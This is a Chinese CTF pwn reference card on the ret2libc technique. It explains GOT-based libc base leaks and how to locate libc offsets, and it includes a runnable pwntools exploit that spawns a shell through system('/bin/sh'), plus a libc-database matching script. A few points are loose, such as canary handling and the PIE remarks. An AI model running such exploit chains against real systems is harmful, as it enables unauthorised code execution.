---
title: ret2libc —— libc 基址泄露与 system("/bin/sh")
category: pwn
tags: [ret2libc, GOT泄露, ASLR, libc-database, 一次泄露]
signals: [题目附带 libc.so.6, 只有 puts/write 无 system, NX 开启且无 win 函数, 有 canary 但无 PIE, 存在 read 和 puts 调用, 程序打印菜单后读输入, 远程与本地 libc 版本不一致]
difficulty: medium
source: "CTF-Wiki 中级 ROP / ir0nstone ret2libc / libc-database"
tools: [pwntools, ROPgadget, gdb, libc-database, patchelf]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 附件压缩包里同时有 `pwn`、`libc.so.6`（常常还有 `ld-2.31.so`），这就是最明确的 ret2libc 信号。
- 程序只用 `read` + `puts`/`write` 交互，没有 `system`，但 `puts@plt` 存在。
- `checksec` 显示 `NX enabled`、`No PIE`，GOT 可读（Partial RELRO 或 Full RELRO 都可读）。
- 题面写「ASLR 已开启」「libc 随机化」，暗示必须泄露。
- 溢出一次后程序还能回到 `main`（末尾 `read` 或 `while`），说明可以做「两次交互」。

## 二、原理

ASLR 随机化 libc 的加载基址，但**同一 libc 内部各符号的相对偏移是固定的**。因此：

```text
leaked_puts_addr = libc_base + offset_of(puts)
libc_base        = leaked_puts_addr - offset_of(puts)
system_addr      = libc_base + offset_of(system)
binsh_addr       = libc_base + offset_of("/bin/sh")
```

泄露步骤依赖 PLT/GOT 机制：
1. 程序调用过 `puts`（或 `read`）后，GOT 项已由动态链接器写成真实地址。
2. 构造 ROP：`pop rdi; ret` → `puts@got` → `puts@plt` → `main`。
3. `puts@plt` 把 GOT 里的 8 字节当字符串打印，我们解析得到真实地址。
4. 程序回到 `main`，再发第二次 payload：`pop rdi; ret` → `/bin/sh` → `system`。

libc 版本未知时的三条路：
- `libc-database` / `libc.rip` 用「符号名 + 低 12 位」查版本。
- 题目给了 libc 时直接 `ELF("./libc.so.6")`，不要用系统 libc。
- 只能泄露一个符号时，用 `libc.sym` 逐个试（写循环跑各候选 libc）。

## 三、checksec 判读与利用思路

```text
RELRO: Partial  Canary: found  NX: enabled  PIE: disabled
```

- `PIE disabled` ⇒ `elf.got['puts']`、`elf.plt['puts']` 都是绝对地址，直接用。若 PIE 开启，需先泄露代码基址。
- `Full RELRO` 只影响「写 GOT」，**读 GOT 泄露仍然有效**。
- 有 Canary 时，先泄露 canary（覆盖到 `\x0a` 截断处），再覆盖返回地址。
- 若只能泄露一次、且没有 `main` 可回，改用**栈迁移**或一次 ROP 内串联（`pop rdi; /bin/sh` 需要 base，可用 `__libc_csu_init` 或 `ret2dlresolve`）。

libc 偏移取证命令：

```bash
# 1) 给定 libc：直接读符号
readelf -sW ./libc.so.6 | grep -E ' (system|puts|read)@@'
strings -a -tx ./libc.so.6 | grep '/bin/sh'

# 2) 未知 libc：从泄露值查
libc-database/find puts <低12位> <puts后3位>
#   或上手网页版 libc.rip / libc.blukat.me
```

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
context.log_level = "info"

def start():
    if args.REMOTE:
        return remote(args.HOST or "TARGET", int(args.PORT or 1337))
    return process()

# ---------- 1) 载入 libc ----------
if args.LIBC:
    libc = ELF(args.LIBC, checksec=False)
else:
    libc = elf.libc          # 本地：用系统/patchelf 后的 libc

PADDING   = b"A" * 0x48                                    # 实测偏移，占位
POP_RDI   = ROP(elf).find_gadget(["pop rdi", "ret"]).address
RET       = ROP(elf).find_gadget(["ret"]).address          # 栈 16 字节对齐用
MAIN      = elf.sym["main"]

# ---------- 2) 泄露 puts 真实地址 ----------
p = start()
payload  = PADDING
payload += p64(POP_RDI) + p64(elf.got["puts"])
payload += p64(RET)                    # 对齐（部分环境需要，报 movaps 时加）
payload += p64(elf.plt["puts"])
payload += p64(MAIN)
p.sendlineafter(b"> ", payload)

leaked = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
libc.address = leaked - libc.sym["puts"]
success(f"leak puts = {hex(leaked)}  libc.base = {hex(libc.address)}")

# ---------- 3) 二次利用 ----------
system = libc.sym["system"]
binsh  = next(libc.search(b"/bin/sh\x00"))
info(f"system = {hex(system)}   /bin/sh = {hex(binsh)}")

payload  = PADDING
payload += p64(POP_RDI) + p64(binsh)
payload += p64(RET)                    # 同样用于栈对齐
payload += p64(system)
p.sendlineafter(b"> ", payload)
p.interactive()
```

未知 libc 时自动匹配（把泄露值灌进 libc-database 并筛选）：

```python
#!/usr/bin/env python3
# 用 libc-database 本地库反查：需要一个以上泄露符号
import subprocess, glob
from pwn import *

leaks = {"puts": 0x7f1234500690}       # 占位：题目泄露到的真实地址
cands = []
for name, addr in leaks.items():
    out = subprocess.check_output(
        ["libc-database/find", name, hex(addr)[-3:]]).decode()
    ids = [l.split()[-1] for l in out.splitlines() if l.startswith("libc")]
    cands = ids if not cands else [i for i in cands if i in ids]

for libcid in cands:
    path = glob.glob(f"libc-database/db/{libcid}")[0] + ".so"
    libc = ELF(path, checksec=False)
    if all(libc.sym.get(n) and (libc.sym[n] & 0xfff) == (a & 0xfff)
           for n, a in leaks.items()):
        success(f"match {libcid} ({path})")
        print("libc base =", hex(leaked := list(leaks.values())[0] - libc.sym["puts"]))
```

## 五、常见坑 / 变体

- **远程 libc 与本地不同**：最经典的翻车点。必须用题目给的 libc + `patchelf`，否则偏移全错、`system` 直接崩。
- **`puts` 输出带 `\n` 截断**：`recvuntil(b"\n")` 后 `ljust(8,b"\x00")`，libc 地址最高两字节是 `\x00`。
- **泄露后崩在 `movaps`**：64 位 `system` 需 16 字节栈对齐，在 gadget 链前插一个 `ret`。
- **程序不回到 `main`**：改用一次 ROP 全链（需要 base），或 `Stack Pivoting` 把栈搬到可控区域。
- **`/bin/sh` 被过滤**：写 `/bin/sh\x00` 到 `.bss`，再用 `read` 读入，传 bss 地址。
- **libc 2.27 以下 `read` 读 0x10 字节可能被截断**：拆成两次 `read` 泄露。
- **PIE 开启**：先泄露 `puts@plt` 拿代码基址，再算 GOT 地址，逻辑相同但加一次偏移。

## 六、参考来源

- [CTF-Wiki: 中级 ROP（ret2libc 原理）](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/)
- [CTF-Wiki: 基本 ROP / 栈迁移](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/)
- [ir0nstone: ret2libc / ret2system](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/ret2libc)
- [ir0nstone: ret2plt ASLR Bypass](https://ir0nstone.gitbook.io/notes/binexp/stack/aslr/ret2plt-aslr-bypass)
- [ir0nstone: Stack Alignment](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment)
- [niklasb/libc-database](https://github.com/niklasb/libc-database)
- [libc.rip 在线查询](https://libc.rip/)
